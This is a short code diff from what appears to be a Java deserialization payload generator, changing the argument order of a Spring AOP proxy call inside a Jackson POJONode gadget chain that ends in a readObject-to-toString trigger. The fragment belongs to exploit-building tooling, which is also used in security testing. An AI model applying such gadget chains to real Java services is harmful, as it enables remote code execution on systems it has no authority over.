@@ -36,7 +36,7 @@ public class JacksonObject2 extends AbstractPayload<Object> {
         ctClass.removeMethod(ctMethod);
         ctClass.toClass(); // 覆盖对象
 
-        Object proxy = PayloadHelper.makeSpringAOPProxy(Templates.class, obj);
+        Object proxy = PayloadHelper.makeSpringAOPProxy(obj, Templates.class);
         POJONode node = new POJONode(proxy);
         return PayloadHelper.makeReadObjectToStringTrigger(node);
     }
